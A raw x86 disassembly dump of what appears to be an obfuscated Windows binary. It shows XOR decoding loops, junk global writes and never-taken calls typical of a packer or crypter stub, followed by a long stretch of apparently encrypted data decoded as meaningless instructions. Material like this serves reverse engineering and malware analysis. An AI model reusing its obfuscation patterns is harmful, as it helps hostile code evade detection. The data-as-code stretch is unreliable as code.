  413f66:	sbb    ecx,DWORD PTR ds:0x42a28e
  413f6c:	lea    eax,[ebp-0x1]
  413f6f:	mov    DWORD PTR [ebp-0xc],eax
  413f72:	mov    al,BYTE PTR [ebp-0x1]
  413f75:	sbb    DWORD PTR ds:0x42a276,0x42a2a6
  413f7f:	mov    ecx,DWORD PTR [ebp-0xc]
  413f82:	xor    al,0x7c
  413f84:	xor    DWORD PTR ds:0x42a27e,0x42a2d2
  413f8e:	inc    al
  413f90:	and    DWORD PTR ds:0x42a262,0x42a2fa
  413f9a:	mov    BYTE PTR [ecx],al
  413f9c:	add    eax,ecx
  413f9e:	mov    DWORD PTR [ebp-0x18],0xf89c85a5
  413fa5:	add    DWORD PTR ds:0x42a272,0x42a28e
  413faf:	push   ebx
  413fb0:	mov    DWORD PTR [ebp-0x8],0xf89c85ba
  413fb7:	mov    ecx,DWORD PTR [ebp-0x18]
  413fba:	push   esi
  413fbb:	mov    esi,DWORD PTR ds:0x42a346
  413fc1:	mov    eax,ds:0x42a372
  413fc6:	sub    eax,esi
  413fc8:	or     esi,DWORD PTR [esi+eax*1]
  413fcb:	mov    eax,0x75108aa
  413fd0:	sub    esi,DWORD PTR ds:0x42a2a6
  413fd6:	xor    ecx,eax
  413fd8:	mov    esi,0x3272f1
  413fdd:	push   edi
  413fde:	sbb    DWORD PTR ds:0x42a2fa,0x42a2f6
  413fe8:	add    ecx,esi
  413fea:	mov    DWORD PTR ds:0x42a2ee,0x6562
  413ff4:	jmp    0x414004
  413ff9:	mov    dl,BYTE PTR [ebp-0x1]
  413ffc:	mov    BYTE PTR [ebp+ecx*1-0x9c],dl
  414003:	inc    ecx
  414004:	mov    DWORD PTR ds:0x42a2de,0x1651
  41400e:	cmp    ecx,0x40
  414011:	jb     0x413ff9
  414017:	mov    DWORD PTR ds:0x42a2ce,0x1c
  414021:	cmp    DWORD PTR ds:0x42a2ce,0x0
  414028:	je     0x414081
  41402e:	cmp    DWORD PTR ds:0x42a2ce,0x5
  414035:	jbe    0x414081
  41403b:	jmp    0x414055
  414040:	push   0x5b36
  414045:	push   0x4291e3
  41404a:	push   0x429247
  41404f:	call   DWORD PTR ds:0x42a3b6
  414055:	cmp    DWORD PTR ds:0x42a2ce,0x6
  41405c:	jne    0x41406f
  414062:	mov    edx,DWORD PTR ds:0x42a2ce
  414068:	dec    edx
  414069:	mov    DWORD PTR ds:0x42a2ce,edx
  41406f:	mov    edx,DWORD PTR ds:0x42a2ce
  414075:	dec    edx
  414076:	mov    DWORD PTR ds:0x42a2ce,edx
  41407c:	jmp    0x414021
  414081:	mov    edx,DWORD PTR [ebp-0x18]
  414084:	and    DWORD PTR ds:0x42a272,0x42a2aa
  41408e:	xor    edx,eax
  414090:	add    DWORD PTR ds:0x42a2d6,0x7605
  41409a:	add    edx,esi
  41409c:	mov    DWORD PTR ds:0x42a2c2,0x2718
  4140a6:	jmp    0x414179
  4140ab:	mov    edi,DWORD PTR [ebp+0x8]
  4140ae:	add    DWORD PTR ds:0x42a2a2,0x1c2b
  4140b8:	mov    ecx,0x8a98
  4140bd:	xor    cx,WORD PTR [edi+edx*4+0x2]
  4140c2:	and    DWORD PTR ds:0x42a26e,0x0
  4140cc:	jmp    0x4140de
  4140d1:	mov    edi,DWORD PTR ds:0x42a26e
  4140d7:	inc    edi
  4140d8:	mov    DWORD PTR ds:0x42a26e,edi
  4140de:	cmp    DWORD PTR ds:0x42a26e,0x1f
  4140e5:	jae    0x414112
  4140eb:	cmp    DWORD PTR ds:0x42a26e,0x20
  4140f2:	jbe    0x414112
  4140f8:	jmp    0x41410d
  4140fd:	push   0x42a2d6
  414102:	push   0x4291fd
  414107:	call   DWORD PTR ds:0x42a3f2
  41410d:	jmp    0x4140d1
  414112:	mov    edi,0x3b5a
  414117:	sbb    DWORD PTR ds:0x42a2f6,0x4902
  414121:	add    cx,di
  414124:	add    DWORD PTR ds:0x42a2ae,0x42a296
  41412e:	movzx  ecx,cx
  414131:	xor    DWORD PTR ds:0x42a29e,0x6377
  41413b:	mov    DWORD PTR [ebp-0xc],ecx
  41413e:	sbb    ecx,DWORD PTR ds:0x42a2f6
  414144:	mov    ecx,DWORD PTR [ebp+0x8]
  414147:	movzx  ecx,WORD PTR [ecx+edx*4]
  41414b:	or     DWORD PTR ds:0x42a2ca,0x42a276
  414155:	xor    ecx,0x8a98
  41415b:	add    ecx,edi
  41415d:	movzx  edi,WORD PTR ds:0x42a2ea
  414164:	mov    edi,DWORD PTR [ebp-0xc]
  414167:	mov    BYTE PTR [ebp+edi*1-0x9c],cl
  41416e:	mov    DWORD PTR ds:0x42a2c6,0x2666
  414178:	inc    edx
  414179:	mov    DWORD PTR ds:0x42a2d6,edi
  41417f:	mov    ecx,DWORD PTR [ebp-0x10]
  414182:	mov    DWORD PTR ds:0x42a2be,0x12d3
  41418c:	cmp    edx,ecx
  41418e:	mov    DWORD PTR ds:0x42a2de,0x4c7d
  414198:	jne    0x4140ab
  41419e:	or     edx,ecx
  4141a0:	mov    ecx,DWORD PTR [ebp-0x18]
  4141a3:	and    DWORD PTR ds:0x42a2e6,0x0
  4141ad:	xor    edi,edi
  4141af:	add    edi,DWORD PTR ds:0x42a2e6
  4141b5:	inc    edi
  4141b6:	mov    DWORD PTR ds:0x42a2e6,edi
  4141bc:	cmp    DWORD PTR ds:0x42a2e6,0x2b
  4141c3:	jl     0x4141eb
  4141c9:	jmp    0x4141de
  4141ce:	push   0x42919f
  4141d3:	push   0x400000
  4141d8:	call   DWORD PTR ds:0x42a3ba
  4141de:	cmp    DWORD PTR ds:0x42a2e6,0x1b
  4141e5:	jb     0x4141ad
  4141eb:	mov    edx,DWORD PTR [ebp+0x10]
  4141ee:	mov    edi,DWORD PTR ds:0x42a27e
  4141f4:	sub    DWORD PTR ds:0x42a2f6,edi
  4141fa:	xor    ecx,eax
  4141fc:	and    edi,0x65ef
  414202:	add    ecx,esi
  414204:	adc    DWORD PTR ds:0x42a25e,0x5774
  41420e:	mov    DWORD PTR [edx],ecx
  414210:	mov    ecx,DWORD PTR [ebp-0x18]
  414213:	xor    ecx,eax
  414215:	add    ecx,esi
  414217:	mov    DWORD PTR ds:0x42a262,0x13
  414221:	cmp    DWORD PTR ds:0x42a262,0x0
  414228:	je     0x41426c
  41422e:	cmp    DWORD PTR ds:0x42a262,0x19
  414235:	jle    0x41426c
  41423b:	jmp    0x414258
  414240:	push   0x34ab
  414245:	push   0x42a2d2
  41424a:	push   DWORD PTR [ebp-0x14]
  41424d:	push   0x8eb1
  414252:	call   DWORD PTR ds:0x42a3f6
  414258:	xor    edi,edi
  41425a:	xor    edi,DWORD PTR ds:0x42a262
  414260:	dec    edi
  414261:	mov    DWORD PTR ds:0x42a262,edi
  414267:	jmp    0x414221
  41426c:	mov    DWORD PTR [ebp-0xc],ecx
  41426f:	mov    DWORD PTR ds:0x42a25a,0x1f
  414279:	cmp    DWORD PTR ds:0x42a25a,0x0
  414280:	je     0x4142c0
  414286:	cmp    DWORD PTR ds:0x42a25a,0x28
  41428d:	ja     0x4142c0
  414293:	jmp    0x4142ae
  414298:	push   0x2e6d
  41429d:	push   DWORD PTR [ebp-0x1c]
  4142a0:	push   DWORD PTR [ebp-0x28]
  4142a3:	push   0x29af
  4142a8:	call   DWORD PTR ds:0x42a3be
  4142ae:	mov    edi,DWORD PTR ds:0x42a25a
  4142b4:	dec    edi
  4142b5:	mov    DWORD PTR ds:0x42a25a,edi
  4142bb:	jmp    0x414279
  4142c0:	mov    DWORD PTR [ebp+0x8],0xf89c85a5
  4142c7:	neg    edi
  4142c9:	mov    DWORD PTR [ebp-0x14],0xf89c85b5
  4142d0:	mov    DWORD PTR [ebp-0x10],0xf89c95a5
  4142d7:	mov    ecx,DWORD PTR [ebp-0x14]
  4142da:	mov    DWORD PTR [ebp+0x8],ecx
  4142dd:	adc    DWORD PTR ds:0x42a28e,0xc59
  4142e7:	mov    ecx,DWORD PTR [ebp+0x8]
  4142ea:	xor    DWORD PTR ds:0x42a2e6,ecx
  4142f0:	xor    ecx,eax
  4142f2:	add    ecx,esi
  4142f4:	mov    ecx,0x242ebc9
  4142f9:	mov    edi,DWORD PTR ds:0x42a29a
  4142ff:	mov    edi,0xf641bc8
  414304:	je     0x41b4b4
  41430a:	mov    ebx,DWORD PTR ds:0x42a256
  414310:	adc    DWORD PTR ds:0x42a25e,ebx
  414316:	mov    edx,DWORD PTR [ebp+0x8]
  414319:	and    DWORD PTR ds:0x42a2ae,0x0
  414323:	jmp    0x414337
  414328:	xor    ebx,ebx
  41432a:	add    ebx,DWORD PTR ds:0x42a2ae
  414330:	inc    ebx
  414331:	mov    DWORD PTR ds:0x42a2ae,ebx
  414337:	cmp    DWORD PTR ds:0x42a2ae,0x12
  41433e:	jae    0x414383
  414344:	cmp    DWORD PTR ds:0x42a2ae,0xc
  41434b:	jle    0x414383
  414351:	jmp    0x414362
  414356:	push   DWORD PTR [ebp-0xc]
  414359:	push   DWORD PTR [ebp-0x18]
  41435c:	call   DWORD PTR ds:0x42a3c2
  414362:	cmp    DWORD PTR ds:0x42a2ae,0xb
  414369:	jne    0x41437e
  41436f:	xor    ebx,ebx
  414371:	or     ebx,DWORD PTR ds:0x42a2ae
  414377:	inc    ebx
  414378:	mov    DWORD PTR ds:0x42a2ae,ebx
  41437e:	jmp    0x414328
  414383:	mov    ebx,DWORD PTR [ebp-0x8]
  414386:	xor    edx,eax
  414388:	adc    DWORD PTR ds:0x42a276,0x42a272
  414392:	xor    ebx,eax
  414394:	sub    edx,ebx
  414396:	sub    DWORD PTR ds:0x42a256,0x2df9
  4143a0:	sub    edx,esi
  4143a2:	and    DWORD PTR ds:0x42a27e,0x0
  4143ac:	jmp    0x4143be
  4143b1:	mov    ebx,DWORD PTR ds:0x42a27e
  4143b7:	inc    ebx
  4143b8:	mov    DWORD PTR ds:0x42a27e,ebx
  4143be:	cmp    DWORD PTR ds:0x42a27e,0x1e
  4143c5:	jae    0x414409
  4143cb:	cmp    DWORD PTR ds:0x42a27e,0x9
  4143d2:	jb     0x414409
  4143d8:	jmp    0x4143e8
  4143dd:	push   0x1065
  4143e2:	call   DWORD PTR ds:0x42a3c6
  4143e8:	cmp    DWORD PTR ds:0x42a27e,0x8
  4143ef:	jne    0x414404
  4143f5:	xor    ebx,ebx
  4143f7:	or     ebx,DWORD PTR ds:0x42a27e
  4143fd:	inc    ebx
  4143fe:	mov    DWORD PTR ds:0x42a27e,ebx
  414404:	jmp    0x4143b1
  414409:	xor    edx,eax
  41440b:	or     ebx,0x35b
  414411:	mov    DWORD PTR [ebp+0x8],edx
  414414:	xor    DWORD PTR ds:0x42a27a,0x56cb
  41441e:	mov    edx,DWORD PTR [ebp+0x8]
  414421:	mov    DWORD PTR ds:0x42a2b2,0x1c
  41442b:	cmp    DWORD PTR ds:0x42a2b2,0x0
  414432:	je     0x41446a
  414438:	cmp    DWORD PTR ds:0x42a2b2,0x1f
  41443f:	jl     0x41446a
  414445:	jmp    0x414458
  41444a:	push   DWORD PTR [ebp-0x18]
  41444d:	push   0x42a2e2
  414452:	call   DWORD PTR ds:0x42a3fa
  414458:	mov    ebx,DWORD PTR ds:0x42a2b2
  41445e:	dec    ebx
  41445f:	mov    DWORD PTR ds:0x42a2b2,ebx
  414465:	jmp    0x41442b
  41446a:	mov    ebx,DWORD PTR [ebp-0x58]
  41446d:	add    edx,0x5708fa
  414473:	sub    DWORD PTR ds:0x42a2ae,0x42a262
  41447d:	imul   edx,ebx
  414480:	movzx  ebx,WORD PTR ds:0x42a2b6
  414487:	sbb    DWORD PTR ds:0x42a2e2,ebx
  41448d:	mov    DWORD PTR [ebp-0x58],edx
  414490:	mov    edx,DWORD PTR [ebp+0x8]
  414493:	and    DWORD PTR ds:0x42a2de,0x0
  41449d:	xor    ebx,ebx
  41449f:	xor    ebx,DWORD PTR ds:0x42a2de
  4144a5:	inc    ebx
  4144a6:	mov    DWORD PTR ds:0x42a2de,ebx
  4144ac:	cmp    DWORD PTR ds:0x42a2de,0x7
  4144b3:	jl     0x4144f3
  4144b9:	jmp    0x4144cc
  4144be:	push   DWORD PTR [ebp-0x20]
  4144c1:	push   0x42a286
  4144c6:	call   DWORD PTR ds:0x42a40a
  4144cc:	cmp    DWORD PTR ds:0x42a2de,0x6
  4144d3:	jne    0x4144e6
  4144d9:	mov    ebx,DWORD PTR ds:0x42a2de
  4144df:	inc    ebx
  4144e0:	mov    DWORD PTR ds:0x42a2de,ebx
  4144e6:	cmp    DWORD PTR ds:0x42a2de,0x14
  4144ed:	jb     0x41449d
  4144f3:	mov    ebx,DWORD PTR [ebp-0x54]
  4144f6:	adc    DWORD PTR ds:0x42a296,0x1f0e
  414500:	add    edx,0x64f898
  414506:	sub    DWORD PTR ds:0x42a2aa,0x42a2d6
  414510:	or     edx,ebx
  414512:	and    DWORD PTR ds:0x42a2ca,0x0
  41451c:	mov    ebx,DWORD PTR ds:0x42a2ca
  414522:	inc    ebx
  414523:	mov    DWORD PTR ds:0x42a2ca,ebx
  414529:	cmp    DWORD PTR ds:0x42a2ca,0x22
  414530:	jb     0x414559
  414536:	jmp    0x41454c
  41453b:	push   DWORD PTR [ebp-0x1c]
  41453e:	push   DWORD PTR [ebp-0x1c]
  414541:	push   0x5112
  414546:	call   DWORD PTR ds:0x42a40e
  41454c:	cmp    DWORD PTR ds:0x42a2ca,0x19
  414553:	jb     0x41451c
  414559:	mov    DWORD PTR [ebp-0x54],edx
  41455c:	sbb    DWORD PTR ds:0x42a2a6,0x5e0b
  414566:	mov    edx,DWORD PTR [ebp+0x8]
  414569:	mov    ebx,DWORD PTR [ebp-0x50]
  41456c:	and    DWORD PTR ds:0x42a2fa,0x42a25e
  414576:	add    edx,ecx
  414578:	add    DWORD PTR ds:0x42a2ae,0x23c2
  414582:	xor    edx,ebx
  414584:	mov    DWORD PTR [ebp-0x50],edx
  414587:	sbb    edx,edx
  414589:	mov    edx,DWORD PTR [ebp+0x8]
  41458c:	add    ebx,DWORD PTR ds:0x42a2f6
  414592:	mov    ebx,DWORD PTR [ebp-0x4c]
  414595:	mov    DWORD PTR ds:0x42a2ca,0x1d36
  41459f:	add    edx,edi
  4145a1:	and    edx,ebx
  4145a3:	mov    DWORD PTR [ebp-0x4c],edx
  4145a6:	and    DWORD PTR ds:0x42a2ee,0x0
  4145b0:	jmp    0x4145c2
  4145b5:	mov    edx,DWORD PTR ds:0x42a2ee
  4145bb:	inc    edx
  4145bc:	mov    DWORD PTR ds:0x42a2ee,edx
  4145c2:	cmp    DWORD PTR ds:0x42a2ee,0x1d
  4145c9:	jae    0x4145fc
  4145cf:	cmp    DWORD PTR ds:0x42a2ee,0x2d
  4145d6:	jbe    0x4145fc
  4145dc:	jmp    0x4145f7
  4145e1:	push   DWORD PTR [ebp-0x14]
  4145e4:	push   DWORD PTR [ebp-0x20]
  4145e7:	push   0x1476
  4145ec:	push   0x4291d1
  4145f1:	call   DWORD PTR ds:0x42a3ca
  4145f7:	jmp    0x4145b5
  4145fc:	mov    edx,DWORD PTR [ebp+0x8]
  4145ff:	mov    ebx,DWORD PTR [ebp-0x48]
  414602:	adc    DWORD PTR ds:0x42a29a,0x42a25e
  41460c:	lea    edx,[ebx+edx*1+0x241fcdf]
  414613:	adc    DWORD PTR ds:0x42a292,0x5ee0
  41461d:	mov    DWORD PTR [ebp-0x48],edx
  414620:	mov    edx,DWORD PTR [ebp+0x8]
  414623:	neg    ebx
  414625:	mov    ebx,0xfa5e1524
  41462a:	sub    ebx,edx
  41462c:	add    ebx,DWORD PTR [ebp-0x44]
  41462f:	mov    DWORD PTR [ebp-0x44],ebx
  414632:	mov    edx,DWORD PTR ds:0x42a36a
  414638:	mov    edx,DWORD PTR [edx]
  41463a:	and    DWORD PTR ds:0x42a2fa,edx
  414640:	mov    edx,DWORD PTR [ebp+0x8]
  414643:	xor    edx,eax
  414645:	mov    DWORD PTR ds:0x42a2f6,0x6c5b
  41464f:	add    edx,esi
  414651:	jne    0x41430a
  414657:	jmp    0x41b4b4
  41465c:	sub    DWORD PTR ds:0x42a286,0x1976
  414666:	mov    edx,DWORD PTR [ebp-0xc]
  414669:	and    DWORD PTR ds:0x42a2f6,0x0
  414673:	jmp    0x414685
  414678:	mov    ebx,DWORD PTR ds:0x42a2f6
  41467e:	inc    ebx
  41467f:	mov    DWORD PTR ds:0x42a2f6,ebx
  414685:	cmp    DWORD PTR ds:0x42a2f6,0x16
  41468c:	jae    0x4146bc
  414692:	cmp    DWORD PTR ds:0x42a2f6,0x26
  414699:	ja     0x4146bc
  41469f:	jmp    0x4146b7
  4146a4:	push   0x71cf
  4146a9:	push   DWORD PTR [ebp-0x24]
  4146ac:	push   0x8216
  4146b1:	call   DWORD PTR ds:0x42a412
  4146b7:	jmp    0x414678
  4146bc:	sub    edx,esi
  4146be:	xor    ebx,DWORD PTR ds:0x42a296
  4146c4:	xor    edx,eax
  4146c6:	sub    DWORD PTR ds:0x42a292,edx
  4146cc:	mov    DWORD PTR [ebp-0x5c],edx
  4146cf:	sub    DWORD PTR ds:0x42a2c2,0x2e82
  4146d9:	mov    edx,DWORD PTR [ebp-0x10]
  4146dc:	mov    ebx,DWORD PTR [ebp-0x8]
  4146df:	mov    DWORD PTR ds:0x42a2a6,0x1dc1
  4146e9:	xor    edx,eax
  4146eb:	and    DWORD PTR ds:0x42a2f2,0x42a2aa
  4146f5:	xor    ebx,eax
  4146f7:	sub    edx,ebx
  4146f9:	or     DWORD PTR ds:0x42a2a2,0x5c58
  414703:	sub    edx,esi
  414705:	xor    DWORD PTR ds:0x42a2ee,0x42a272
  41470f:	xor    edx,eax
  414711:	mov    DWORD PTR ds:0x42a2c6,0x43a7
  41471b:	mov    DWORD PTR [ebp-0x10],edx
  41471e:	mov    edx,DWORD PTR [ebp-0x14]
  414721:	mov    DWORD PTR ds:0x42a27a,0x5a8e
  41472b:	mov    DWORD PTR [ebp+0x8],edx
  41472e:	jmp    0x416bda
  414733:	and    DWORD PTR ds:0x42a262,0x0
  41473d:	xor    edx,edx
  41473f:	or     edx,DWORD PTR ds:0x42a262
  414745:	inc    edx
  414746:	mov    DWORD PTR ds:0x42a262,edx
  41474c:	cmp    DWORD PTR ds:0x42a262,0xb
  414753:	jge    0x4147a6
  414759:	jmp    0x41477f
  41475e:	push   0x42a28a
  414763:	push   DWORD PTR [ebp-0x18]
  414766:	push   DWORD PTR [ebp-0x14]
  414769:	push   0x686f
  41476e:	push   0x7e68
  414773:	push   DWORD PTR [ebp-0x1c]
  414776:	push   DWORD PTR [ebp-0x14]
  414779:	call   DWORD PTR ds:0x42a3ce
  41477f:	cmp    DWORD PTR ds:0x42a262,0xa
  414786:	jne    0x414799
  41478c:	mov    edx,DWORD PTR ds:0x42a262
  414792:	inc    edx
  414793:	mov    DWORD PTR ds:0x42a262,edx
  414799:	cmp    DWORD PTR ds:0x42a262,0x18
  4147a0:	jb     0x41473d
  4147a6:	mov    edx,DWORD PTR [ebp+0x8]
  4147a9:	adc    DWORD PTR ds:0x42a2e2,edi
  4147af:	mov    ebx,DWORD PTR [ebp-0x8]
  4147b2:	adc    DWORD PTR ds:0x42a25e,0x42a292
  4147bc:	xor    edx,eax
  4147be:	add    DWORD PTR ds:0x42a29e,0x4f03
  4147c8:	xor    ebx,eax
  4147ca:	sbb    DWORD PTR ds:0x42a2e2,0x7f15
  4147d4:	sub    edx,ebx
  4147d6:	and    DWORD PTR ds:0x42a2d2,0x0
  4147e0:	mov    ebx,DWORD PTR ds:0x42a2d2
  4147e6:	inc    ebx
  4147e7:	mov    DWORD PTR ds:0x42a2d2,ebx
  4147ed:	cmp    DWORD PTR ds:0x42a2d2,0x21
  4147f4:	jle    0x414817
  4147fa:	jmp    0x41480a
  4147ff:	push   0x5080
  414804:	call   DWORD PTR ds:0x42a3d6
  41480a:	cmp    DWORD PTR ds:0x42a2d2,0x1a
  414811:	jb     0x4147e0
  414817:	sub    edx,esi
  414819:	xor    edx,eax
  41481b:	mov    DWORD PTR [ebp+0x8],edx
  41481e:	mov    edx,DWORD PTR [ebp+0x8]
  414821:	mov    ebx,DWORD PTR [ebp-0x58]
  414824:	add    edx,0x5708fa
  41482a:	imul   edx,ebx
  41482d:	mov    DWORD PTR [ebp-0x58],edx
  414830:	mov    edx,DWORD PTR [ebp+0x8]
  414833:	mov    ebx,DWORD PTR [ebp-0x54]
  414836:	add    edx,0x64f898
  41483c:	or     edx,ebx
  41483e:	mov    DWORD PTR [ebp-0x54],edx
  414841:	mov    edx,DWORD PTR [ebp+0x8]
  414844:	mov    ebx,DWORD PTR [ebp-0x50]
  414847:	add    edx,ecx
  414849:	xor    edx,ebx
  41484b:	mov    DWORD PTR [ebp-0x50],edx
  41484e:	mov    edx,DWORD PTR [ebp+0x8]
  414851:	mov    ebx,DWORD PTR [ebp-0x4c]
  414854:	add    edx,edi
  414856:	and    edx,ebx
  414858:	mov    DWORD PTR [ebp-0x4c],edx
  41485b:	mov    edx,DWORD PTR [ebp+0x8]
  41485e:	mov    ebx,DWORD PTR [ebp-0x48]
  414861:	lea    edx,[ebx+edx*1+0x241fcdf]
  414868:	mov    DWORD PTR [ebp-0x48],edx
  41486b:	mov    edx,DWORD PTR [ebp+0x8]
  41486e:	mov    ebx,0xfa5e1524
  414873:	sub    ebx,edx
  414875:	add    ebx,DWORD PTR [ebp-0x44]
  414878:	mov    DWORD PTR [ebp-0x44],ebx
  41487b:	jmp    0x416bda
  414880:	inc    esp
  414881:	arpl   WORD PTR [esi+esi*8],di
  414884:	and    al,0x96
  414886:	xchg   ch,cl
  414888:	sahf   
  414889:	pushf  
  41488a:	ja     0x41486e
  41488c:	jb     0x414868
  41488e:	leave  
  41488f:	push   edx
  414890:	mov    bh,0x66
  414892:	jl     0x414817
  414894:	cmp    eax,0xe883835e
  414899:	sbb    ebp,DWORD PTR [eax+0x7]
  41489c:	lea    ecx,[ebx+0x6b]
  41489f:	in     al,dx
  4148a0:	push   eax
  4148a1:	or     BYTE PTR [edx-0x73],cl
  4148a4:	dec    ecx
  4148a5:	mov    ecx,0x5dbec001
  4148aa:	or     BYTE PTR ds:0x1196d0fb,bh
  4148b0:	sar    DWORD PTR [ebx-0x45],1
  4148b3:	sbb    eax,0x27283857
  4148b8:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4148b9:	mov    edx,0x93f6046c
  4148be:	das    
  4148bf:	pop    esi
  4148c0:	int    0x1b
  4148c2:	mov    ebx,0x88d30e23
  4148c7:	std    
  4148c8:	mov    ch,0xcf
  4148ca:	inc    ecx
  4148cb:	dec    ebp
  4148cc:	mov    bl,0xd4
  4148ce:	retf   0xfa17
  4148d1:	xor    BYTE PTR [edi-0x616a2431],al
  4148d7:	addr16 xchg edi,eax
  4148d9:	mov    edx,0x8043a39b
  4148de:	xor    DWORD PTR [ebx],0xffffff85
  4148e1:	ficomp WORD PTR [eax]
  4148e3:	jne    0x4148d3
  4148e5:	(bad)  
  4148e6:	pusha  
  4148e7:	jmp    0x5d63c7a3
  4148ec:	or     BYTE PTR [edi-0x27],ch
  4148ef:	adc    eax,0xcf0c1ce5
  4148f4:	add    al,0x95
  4148f6:	push   ds
  4148f7:	sub    al,0x9b
  4148f9:	sbb    ebx,DWORD PTR [edx-0x5e413b2d]
  4148ff:	fisubr DWORD PTR [esi-0x16c1dde6]
  414905:	jle    0x414909
  414907:	pop    esi
  414908:	int3   
  414909:	ins    DWORD PTR es:[edi],dx
  41490a:	or     eax,0x497753c1
  41490f:	add    ch,BYTE PTR [eax]
  414911:	sub    DWORD PTR gs:[ebp-0x2521ef5e],ebx
  414918:	pushf  
  414919:	test   eax,0x4550d4e6
  41491e:	xor    BYTE PTR [edi],ah
  414920:	out    dx,al
  414921:	js     0x4148ba
  414923:	push   es
  414924:	mov    bl,0x6
  414926:	scas   al,BYTE PTR es:[edi]
  414927:	cmp    al,0xbd
  414929:	pop    ss
  41492a:	jl     0x414952
  41492c:	call   0xb9fe952f
  414931:	sub    BYTE PTR [edi],dh
  414933:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  414934:	addr16 push ds
  414936:	jl     0x4148bc
  414938:	ud0    esi,ebp
  41493b:	arpl   WORD PTR [edx+0x2bd773df],ax
  414941:	sub    DWORD PTR [ebx-0x75],esi
  414944:	popa   
  414945:	shl    BYTE PTR [eax],cl
  414947:	ficom  WORD PTR [esi-0x6ab3dcd0]
  41494d:	inc    ebx
  41494e:	(bad)  
  41494f:	sub    DWORD PTR [ebx-0xf639694],esi
  414955:	mov    al,ds:0x700e68dd
  41495a:	pop    ecx
  41495b:	lds    edx,FWORD PTR [ebx]
  41495d:	cli    
  41495e:	adc    BYTE PTR [esi],dl
  414960:	sbb    bl,BYTE PTR [eax-0xe]
  414963:	sbb    DWORD PTR [edx+ecx*4],esp
  414966:	stc    
  414967:	mov    cl,0x2c
  414969:	nop
  41496a:	loop   0x41492c
  41496c:	push   cs
  41496d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41496e:	mov    DWORD PTR [eax-0x3],edx
  414971:	sbb    al,0xce
  414973:	push   eax
  414974:	sbb    BYTE PTR [esi+0x55],bl
  414977:	les    ecx,FWORD PTR [ebx+0x5b4cf8af]
  41497d:	popf   
  41497e:	push   ds
  41497f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  414980:	addr16 in eax,dx
  414982:	or     esi,edx
  414984:	or     BYTE PTR [edi+0x11aa04e6],al
  41498a:	dec    edi
  41498b:	(bad)  
  41498c:	jae    0x4149e1
  41498e:	mov    edx,DWORD PTR [esi+0x56]
  414991:	jle    0x4149a1
  414993:	das    
  414994:	push   0x1c402fd
  414999:	jecxz  0x41499b
  41499b:	fs xchg ebx,edx
  41499e:	cld    
  41499f:	mov    esp,0x7b457326
  4149a4:	cmp    al,0xfb
  4149a6:	pop    edx
  4149a7:	push   ds
  4149a8:	outs   dx,BYTE PTR ds:[esi]
  4149a9:	mov    ch,0x1a
  4149ab:	cli    
  4149ac:	jb     0x4149c2
  4149ae:	fdivr  QWORD PTR [ecx+0x24]
  4149b1:	mov    esi,eax
  4149b3:	or     eax,0x1b38a220
  4149b8:	fwait
  4149b9:	sub    eax,0x316bf0e8
  4149be:	inc    eax
  4149bf:	nop
  4149c0:	cwde   
  4149c1:	pop    es
  4149c2:	cmp    DWORD PTR [edi+esi*2-0x15],esi
  4149c6:	inc    esi
  4149c7:	retf   
  4149c8:	xor    ecx,DWORD PTR [ecx+0x5]
  4149cb:	daa    
  4149cc:	xchg   edx,eax
  4149cd:	lds    edi,FWORD PTR [ecx+0x2662115b]
  4149d3:	sbb    eax,0x681e1412
  4149d8:	fcmovnb st,st(0)
  4149da:	ss jecxz 0x414a11
  4149dd:	mov    BYTE PTR [esi],dl
  4149df:	out    dx,eax
  4149e0:	gs aas 
  4149e2:	(bad)  
  4149e3:	imul   esi,esi,0xfac4898
  4149e9:	pop    edi
  4149ea:	pop    ebx
  4149eb:	loopne 0x4149af
  4149ed:	lahf   
  4149ee:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4149ef:	pop    esi
  4149f0:	xor    dl,bh
  4149f2:	pop    ss
  4149f3:	in     eax,dx
  4149f4:	fsub   st,st(7)
  4149f6:	mov    al,BYTE PTR [ebx+0x28158acf]
  4149fc:	pop    es
  4149fd:	and    ebx,esp
  4149ff:	or     esp,DWORD PTR [ebx-0x1b]
  414a02:	add    DWORD PTR [ebx+eax*2-0x2450976b],ebp
  414a09:	mov    al,0xc1
  414a0b:	stos   BYTE PTR es:[edi],al
  414a0c:	add    ecx,DWORD PTR ds:0xbdab0ab
  414a12:	add    al,0x49
  414a14:	push   edx
  414a15:	cmp    bl,0x9
  414a18:	out    dx,al
  414a19:	xor    esp,DWORD PTR [edi+esi*4]
  414a1c:	xchg   edx,eax
  414a1d:	inc    ecx
  414a1e:	xlat   BYTE PTR ds:[ebx]
  414a1f:	mov    al,ds:0x9eed145e
  414a24:	jmp    0xd7dc237a
  414a29:	xchg   esp,eax
  414a2a:	cdq    
  414a2b:	test   eax,0x71cf8d0c
  414a30:	jno    0x4149e5
  414a32:	jo     0x414a74
  414a34:	sub    DWORD PTR [esi+edi*8-0x57],ebp
  414a38:	cwde   
  414a39:	xor    DWORD PTR [edx+0x79],eax
  414a3c:	loope  0x414a51
  414a3e:	sub    eax,0xa39935e5
  414a43:	cmp    al,0x44
  414a45:	and    al,0x67
  414a47:	iret   
  414a48:	mov    dl,0xaf
  414a4a:	in     al,0x34
  414a4c:	jno    0x414a1f
  414a4e:	push   esi
  414a4f:	ret    
  414a50:	std    
  414a51:	repz (bad) 
  414a53:	jno    0x414a4f
  414a55:	adc    dh,bl
  414a57:	jae    0x414a46
  414a59:	movaps xmm1,XMMWORD PTR [eax-0x6d8bea0]
  414a60:	mov    cl,0x26
  414a62:	mov    dl,0xda
  414a64:	mov    ah,0x62
  414a66:	div    DWORD PTR [ebx]
  414a68:	mov    eax,edx
  414a6a:	cmp    ebx,ebp
  414a6c:	xor    DWORD PTR [eax],edx
  414a6e:	mov    esp,0xc870f5be
  414a73:	sbb    DWORD PTR [ebp+0x24a71364],edi
  414a79:	ret    0xab16
  414a7c:	sbb    BYTE PTR [edi],bh
  414a7e:	or     DWORD PTR [ecx-0x69],ebx
  414a81:	mov    ebp,0x9101fc80
  414a86:	adc    BYTE PTR [ebx+esi*2],ah
  414a89:	lods   eax,DWORD PTR ds:[esi]
  414a8a:	cmp    BYTE PTR [edx+0x6e],dl
  414a8d:	rcr    bh,1
  414a8f:	dec    ebp
  414a90:	in     al,dx
  414a91:	dec    edx
  414a92:	mov    WORD PTR [esi],ss
  414a94:	mov    al,ah
